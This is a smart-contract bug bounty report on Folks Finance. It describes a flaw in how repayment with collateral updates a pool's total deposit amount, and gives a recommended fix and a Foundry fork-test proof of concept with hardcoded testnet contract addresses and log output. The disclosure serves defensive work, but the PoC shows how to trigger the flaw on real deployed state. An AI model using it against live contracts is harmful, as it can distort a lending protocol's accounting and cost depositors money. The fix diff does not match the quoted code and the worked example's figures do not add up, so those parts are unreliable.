# Boost \_ Folks Finance 34179 - \[Smart Contract - High] Incorrect Updates to pooldepositDatatotalAmoun

Submitted on Tue Aug 06 2024 06:41:08 GMT-0400 (Atlantic Standard Time) by @alix\_40 for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #34179

Report type: Smart Contract

Report severity: High

Target: <https://testnet.snowtrace.io/address/0x2cAa1315bd676FbecABFC3195000c642f503f1C9>

Impacts:

* Theft of unclaimed yield
* Smart contract unable to operate due to lack of token funds

## Description

> This report is intended to be submitted under my team account "A2Security" but I reached the report submission rate limit on the last day. Please count this report as though it were from "A2Security".

## Description

* The protocol's repayment with collateral mechanism contains a mathematical flaw in its accounting logic, specifically affecting the updates of `pool.depositData.totalAmount` during repayment operations.
* In a properly functioning system, `depositData.totalAmount` should never exceed the sum of the **pool's actual balance** plus **the total borrowed amount**. This invariant ensures accurate representation of the pool's financial state and is crucial for various protocol operations.
* The repayment with collateral process involves users repaying their loans using their deposited collateral instead of external funds.However, the current implementation in `LoanManagerLogic.sol` incorrectly updates the `totalAmount`

```solidity
function updateWithRepayWithCollateral(HubPoolState.PoolData storage pool, uint256 principalPaid, uint256 interestPaid, uint256 loanStableRate)
    external
    returns (DataTypes.RepayWithCollateralPoolParams memory repayWithCollateralPoolParams)
{
    // ... other code ...
    pool.depositData.totalAmount -= principalPaid - interestPaid; // Incorrect update
    // ... rest of the function
}
```

* It subtracts `principalPaid - interestPaid` from `totalAmount`, which effectively reduces the total amount by the principal and increases it by the interest. This is incorrect because the interest should not be added to `totalAmount`.
* The issue arises because when a user repays with collateral, the interest they're paying is already accounted in `pool.depositData.totalAmount`. This amount was included when the user initially deposited their collateral. By adding the interest again during repayment, we're double-counting this value, leading to an artificial inflation of `totalAmount`.

This mishandling leads to several issues:

1. `pool.depositData.totalAmount` becomes inflated, exceeding the actual balance held in the pool.
2. The discrepancy between `totalAmount` and the actual pool balance grows over time, compounding with each repayment using collateral.
3. The inflated `totalAmount` affects critical calculations such as utilization ratios, interest rates, and liquidity assessments.

* As an example lets take the following scenario:

1. A user deposits 1000 USDC into the pool.
   * `loan.collateralUsed` = 1000 USDC(in terms of FUSDC)
   * `pool.depositData.totalAmount` = 1000 USDC
   * `loan.borrowUsed` = 0
   * `actual poolHub balance` = 1000 USDC
2. The user borrows 900 USDC against this deposit. A after some time the user repays the loan with his collateral with interest of 60 USDC, the state after the repayment will be :
   * `loan.collateralUsed` = 40
   * `pool.depositData.totalAmount` = 160 (incorrectly updated)
   * `loan.borrowUsed` = 0
   * `actual poolHub balance` = 100 USDC

This shows a mismatch where `pool.depositData.totalAmount` is higher than the actual pool balance, which should not happen.

## Impact

The inflated `totalDepositAmount` in the protocol leads to several significant effects:

* **Utilization Ratio**: The utilization ratio calculated in `HubPoolLogic.sol` is artificially lowered, as it uses `totalDeposits` in the denominator. This makes it appear that a smaller portion of available funds is being utilized.
* **Interest Rates**: Both **borrowing** and **lending** interest rates, derived from the utilization ratio, are affected. The lower perceived utilization results in the protocol setting lower interest rates than it should, potentially **underpricing risk**.
* **Deposit Indexes**: Deposit interest index calculations are impacted, leading to an **underestimation** of depositors' share growth over time. T Due to the undervalued deposits index resulting from the false utilization ratio (lower UT means lower `Ftoken` value ), a portion of user funds become **locked** in the protocol, as the calculated value of their `Ftoken` would be less than the actual value.
* **Caps and Limits**: Functions like `isDepositCapReached` or `isBorrowCapReached` operate with incorrect values.

These effects compound over time, leading to increasing discrepancies between the protocol's perceived state and its actual financial position. which will result in significant **financial inaccuracies** .

## Tools Used

Manual Review

## Recomandation :

* In the `updateWithRepayWithCollateral` function in `LoanManagerLogic.sol` we should only subtract the `principal` from `totalAmount`:

```diff
function updateWithRepayWithCollateral(HubPoolState.PoolData storage pool, uint256 principalPaid, uint256 interestPaid, uint256 loanStableRate)
    external
    returns (DataTypes.RepayWithCollateralPoolParams memory repayWithCollateralPoolParams)
{
    // ... other code ...
-    uint256 fAmountRepaid = principalPaid - interestPaid
+    pool.depositData.totalAmount -= principalPaid;

    // ... rest of the function
}
```

## Proof of concept

## Proof of Concept

* here a coded poc shows how repaying with collateral will lead to an inflated `totalDepositAmount` that is more than the `actual pool balance + total borrowed amount` ,
* please run test with : `forge test --mt test_poc_01 -vvv --via-ir`

```log
[PASS] test_poc_01() (gas: 1454096)
Logs:
  amount to repay  4327641473
  actual balance before                :  2715350070
  totalDeposited minus borrowed before :  2714348991
  actual balance after                 :  2872986419
  totalDeposited minus borrowed after  :  3199626813
```

to run test please first add the following file to `test/pocs/base_test.sol`

```solidity
   // SPDX-License-Identifier: UNLICENSED
   pragma solidity ^0.8.19;

   import "@forge-std/Test.sol";
   import "contracts/hub/Hub.sol";
   import "contracts/spoke/SpokeToken.sol";
   import "contracts/spoke/SpokeCommon.sol";
   import "contracts/hub/HubPool.sol";
   import "contracts/hub/LoanManager.sol";
   import "contracts/bridge/libraries/Messages.sol";
   import "contracts/hub/AccountManager.sol";
   import "contracts/bridge/BridgeRouter.sol";
   import "contracts/bridge/HubAdapter.sol";
   import "contracts/oracle/modules/NodeManager.sol";
   import "contracts/hub/OracleManager.sol";
   import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

   contract baseTest is Test {
      using SafeERC20 for address;
      // Hub public hub;

      uint256 mainnetFork;
      bytes32 public constant PREFIX = "HUB_ADAPTER_V1";
      address constant HUB_ADDRESS = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140; // Assuming this is the Hub address
      address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;
      address constant SPOKE_USDC = 0x89df7db4af48Ec7A84DE09F755ade9AF1940420b;
      address constant HUBPOOL_USDC = 0x1968237f3a7D256D08BcAb212D7ae28fEda72c34;
      address constant HUBPOOL_AVAX = 0xd90B7614551E799Cdef87463143eCe2efd4054f9;
      address constant SPOKE_AVAX = 0xBFf8b4e5f92eDD0A5f72b4b0E23cCa2Cc476ce2a;
      address constant LOAN_MANAGER = 0x2cAa1315bd676FbecABFC3195000c642f503f1C9;
      address constant ACCOUNT_MANAGER = 0x3324B5BF2b5C85999C6DAf2f77b5a29aB74197cc;
      address constant USDC_TOKEN = 0x5425890298aed601595a70AB815c96711a31Bc65;
      address constant ADAPTER = 0xf472ab58969709De9FfEFaeFFd24F9e90cf8DbF9;
      address constant LISTING_ROLE = 0x16870a6A85cD152229B97d018194d66740f932d6;
      address constant BRIDGE_ROUTER_HUB = 0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837;
      address constant ORACLE_MANAGER = 0x46c425F4Ec43b25B6222bcc05De051e6D3845165;
      address constant NODE_MANAGER = 0xA758c321DF6Cd949A8E074B22362a4366DB1b725;
      uint16 constant STABELE_LOAN_TYPE_ID = 1;
      uint16 constant VARIABLE_LOAN_TYPE_ID = 2;
      uint16 constant CHAIN_ID = 1; // Assuming Ethereum mainnet

      Hub hub;
      SpokeCommon spokeCommon;
      AccountManager accountManager;
      SpokeToken spokeUsdc;
      SpokeToken spokeAvax;
      HubPool hubPoolUsdc;
      HubPool hubPoolAvax;
      LoanManager loanManager;
      HubAdapter adapter;
      BridgeRouter bridgeRouterHub;
      NodeManager nodeManager;
      OracleManager oracleManager;
      Messages.MessageParams DUMMY_MESSAGE_PARAMS = Messages.MessageParams({adapterId: 1, returnAdapterId: 1, receiverValue: 0, gasLimit: 0, returnGasLimit: 0});
      ///// users account ids :
      address bob = makeAddr("bob");
      address alice = makeAddr("alice");
      bytes32 bobAccountId;
      bytes32 aliceAccountId;
      bytes32[] bobLoanIds;
      bytes32[] aliceLoanIds;

      function setUp() public {
         // Fork Avalanche mainnet
         mainnetFork = vm.createFork("https://api.avax-test.network/ext/bc/C/rpc", 35000569);
         vm.selectFork(mainnetFork);

         // Initialize contracts
         bridgeRouterHub = BridgeRouter(BRIDGE_ROUTER_HUB);
         hub = Hub(HUB_ADDRESS);
         spokeCommon = SpokeCommon(SPOKE_COMMON);
         spokeUsdc = SpokeToken(SPOKE_USDC);
         spokeAvax = SpokeToken(SPOKE_AVAX);
         hubPoolUsdc = HubPool(HUBPOOL_USDC);
         hubPoolAvax = HubPool(HUBPOOL_AVAX);
         loanManager = LoanManager(LOAN_MANAGER);
         accountManager = AccountManager(ACCOUNT_MANAGER);
         adapter = HubAdapter(ADAPTER);
         nodeManager = NodeManager(NODE_MANAGER);
         oracleManager = OracleManager(ORACLE_MANAGER);
         // create account ids for bob and alice :
         address[] memory _users = new address[](2);
         _users[0] = bob;
         _users[1] = alice;
         bytes32[] memory ids = _createAccounts(_users);
         bobAccountId = ids[0];
         aliceAccountId = ids[1];
         // create loanids for alice and bob :
         bobLoanIds.push(_createLoan(bobAccountId, bob, 1, VARIABLE_LOAN_TYPE_ID));
         bobLoanIds.push(_createLoan(bobAccountId, bob, 2, STABELE_LOAN_TYPE_ID));

         aliceLoanIds.push(_createLoan(aliceAccountId, alice, 1, VARIABLE_LOAN_TYPE_ID));
         aliceLoanIds.push(_createLoan(aliceAccountId, alice, 2, STABELE_LOAN_TYPE_ID));

         // credit bob and alice with 1M usdc and 1000 avax each :
         deal(USDC_TOKEN, bob, 1e12);
         deal(USDC_TOKEN, alice, 1e12);
         vm.deal(bob, 100000e18);
         vm.deal(alice, 100000e18);
      }
      ////////////////////////////////////// helpers ///////////////////////////////////////////

      function _creditAvax(address to, uint256 amount) internal {
         vm.deal(to, amount);
      }

      function _creditUsdc(address to, uint256 amount) internal {
         deal(USDC_TOKEN, to, amount);
      }

      function _approveUsdc(address from, address to, uint256 amount) internal {
         vm.prank(from);
         IERC20(USDC_TOKEN).approve(to, amount);
      }

      function _createAccounts(address[] memory users) internal returns (bytes32[] memory) {
         bytes32 id;
         bytes32[] memory ids = new bytes32[](users.length);
         for (uint256 i = 0; i < users.length; i++) {
               id = keccak256(abi.encode(i, "testing"));
               vm.prank(users[i]);
               spokeCommon.createAccount(DUMMY_MESSAGE_PARAMS, id, "");
               assertTrue(accountManager.isAccountCreated(id));
               ids[i] = id;
         }
         return ids;
      }

      function _createLoan(bytes32 accId, address _sender, uint256 nonce, uint16 _loanType) internal returns (bytes32) {
         bytes32 loanId = keccak256(abi.encode(accId, nonce, "loan"));
         uint16 loanType = _loanType;
         bytes32 loanName = keccak256(abi.encode(loanId, loanType));
         // create the loan :
         vm.prank(_sender);
         spokeCommon.createLoan(DUMMY_MESSAGE_PARAMS, accId, loanId, loanType, loanName);
         // check if the loan is created :
         assertTrue(loanManager.isUserLoanActive(loanId));
         return loanId;
      }

      function _createLoanAndDeposit(bytes32 _accountId, address sender, uint256 nonce, uint16 loanType, uint256 _amount, SpokeToken spoke) internal {
         bytes32 loanId = keccak256(abi.encode(_accountId, nonce, "loan"));
         uint16 loanTypeId = loanType; // or VARIABLE_LOAN_TYPE_ID
         bytes32 loanName = keccak256(abi.encode(loanId, loanTypeId));

         vm.prank(sender);
         spoke.createLoanAndDeposit(DUMMY_MESSAGE_PARAMS, _accountId, loanId, _amount, loanTypeId, loanName);
      }

      function _createLoanAndDeposit(bytes32 _accountId, address sender, bytes32 _loanId, uint16 loanType, uint256 _amount, SpokeToken spoke) internal {
         bytes32 loanId = _loanId;
         uint16 loanTypeId = loanType; // or VARIABLE_LOAN_TYPE_ID
         bytes32 loanName = keccak256(abi.encode(loanId, loanTypeId));

         vm.prank(sender);
         spoke.createLoanAndDeposit(DUMMY_MESSAGE_PARAMS, _accountId, loanId, _amount, loanTypeId, loanName);
      }

      function _borrowVariable(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount) internal {
         _borrow(sender, _accountId, _loanId, _poolId, _amount, 0);
      }

      function _borrowStable(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, uint256 _maxStableRate) internal {
         _borrow(sender, _accountId, _loanId, _poolId, _amount, _maxStableRate);
      }

      function _borrow(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, uint256 _maxStableRate) internal {
         vm.prank(sender);
         spokeCommon.borrow(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, CHAIN_ID, _amount, _maxStableRate);
      }

      function _deposit(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount, SpokeToken spoke) internal {
         vm.prank(sender);
         spoke.deposit(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
      }

      function _depositAvax(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount) internal {
         vm.prank(sender);
         spokeAvax.deposit{value: _amount}(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
         // spoke.deposit(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
      }

      function _withdraw(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, bool isFAmount) internal {
         vm.prank(sender);
         spokeCommon.withdraw(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, CHAIN_ID, _amount, isFAmount);
      }

      function _repay(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount, SpokeToken spoke, uint256 maxOverRepayment) internal {
         vm.prank(sender);
         spoke.repay(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount, maxOverRepayment);
      }

      function _repayWithCollateral(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount, uint8 _poolId) internal {
         vm.prank(sender);
         spokeCommon.repayWithCollateral(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, _amount);
      }

      function _getMsgId() internal view returns (bytes32) {
         uint256 s = adapter.sequence();
         return keccak256(abi.encodePacked(PREFIX, s));
      }

      function _checkSeccuss(bytes32 msgId) internal {
         vm.expectEmit();
         emit BridgeRouter.MessageSucceeded(1, msgId);
      }

      function _checkMessageSeccuss() internal {
         // vm.exepctEmit(true,false,false);
         // emit BridgeRouter.MessageSuccess(0,"");
      }
   }

```

* then please add the poc test to `test/pocs/forktest.t.sol`

```solidity

   // SPDX-License-Identifier: UNLICENSED
   pragma solidity ^0.8.23;

   import "./base_test.sol";
   import "contracts/oracle/storage/NodeDefinition.sol";
   contract forktest is baseTest {
      //////////////////////////////////////////////////////////////////////////////////////////
      ////////////         poc incorrect calculation for repayWithCollateral         ///////////
      //////////////////////////////////////////////////////////////////////////////////////////
      // @note : you should run this test with --via-ir flag :
      function test_poc_01() public {
         // get the prestate vars :
         uint256 totalDepositBefore = hubPoolUsdc.getDepositData().totalAmount;
         uint256 totalBorrowBefore = hubPoolUsdc.getVariableBorrowData().totalAmount + hubPoolUsdc.getStableBorrowData().totalAmount;
         uint256 poolActualBalance = IERC20(USDC_TOKEN).balanceOf(address(hubPoolUsdc));
         // update caps :
         vm.startPrank(LISTING_ROLE);
         loanManager.updateLoanPoolCaps(2, hubPoolUsdc.getPoolId(), 1e12, 1e11);
         hubPoolUsdc.updateCapsData(HubPoolState.CapsData(type(uint64).max, type(uint64).max, 1e18));
         vm.stopPrank();

         // bob deposit some token as collateral in a pool id
         uint256 bobDeposit = 1e10; // 10000 usdc
         _approveUsdc(bob, address(spokeUsdc), bobDeposit);
         _deposit(bob, bobAccountId, bobLoanIds[0], bobDeposit, spokeUsdc);
         // borrow same token given that collateral factor is 0.5 :
         uint256 borrowAmount = 0.4e10; // 4000usdc
         _borrowVariable(bob, bobAccountId, bobLoanIds[0], hubPoolUsdc.poolId(), borrowAmount);
         // skip some time and repay your loan with collateral
         skip(730 days); // two years
         // update intrestIndexes :
         hubPoolUsdc.updateInterestIndexes();
         // get the user loan after some time :
         (,, uint8[] memory colPools, uint8[] memory borPools, LoanManagerState.UserLoanCollateral[] memory coll, LoanManagerState.UserLoanBorrow[] memory borr) =
               loanManager.getUserLoan(bobLoanIds[0]);
         assertTrue(colPools.length == borPools.length && colPools.length == 1, "not 1 length");
         assertTrue(coll.length == borr.length && coll.length == 1, "not 1 length structs ");
         // get the dpositData.totalAmount , and check that is more then the actual funds in the pool
         uint256 poolVariableInterestIndex = hubPoolUsdc.getVariableBorrowData().interestIndex;
         uint256 amountToRepay = MathUtils.calcBorrowBalance(borr[0].balance, poolVariableInterestIndex, borr[0].lastInterestIndex);
         console.log("amount to repay ", amountToRepay);
         _repayWithCollateral(bob, bobAccountId, bobLoanIds[0], amountToRepay, hubPoolUsdc.poolId());
         // bob withdraws remaining collateral :
         (uint8 pId, uint256 collBall) = getPoolAndColl(bobLoanIds[0]);
         _withdraw(bob, bobAccountId, bobLoanIds[0], pId, collBall, true);
         // get the post state vars :
         uint256 totalDepositAfter = hubPoolUsdc.getDepositData().totalAmount;
         uint256 totalBorrowAfter = hubPoolUsdc.getVariableBorrowData().totalAmount + hubPoolUsdc.getStableBorrowData().totalAmount;

         uint256 poolActualBalanceAfter = IERC20(USDC_TOKEN).balanceOf(address(hubPoolUsdc));
         // logs :
         // now notice that : totalDeposit in this case is inflated and it's actually more then the actual  balance :
         uint256 availableBalanceBefore = (totalDepositBefore - totalBorrowBefore);
         uint256 availableBalanceAfter = totalDepositAfter - totalBorrowAfter;
         console.log("actual balance before                : ", poolActualBalance);
         console.log("totalDeposited minus borrowed before : ", availableBalanceBefore);
         console.log("actual balance after                 : ", poolActualBalanceAfter);
         console.log("totalDeposited minus borrowed after  : ", availableBalanceAfter);
      }
   }
```
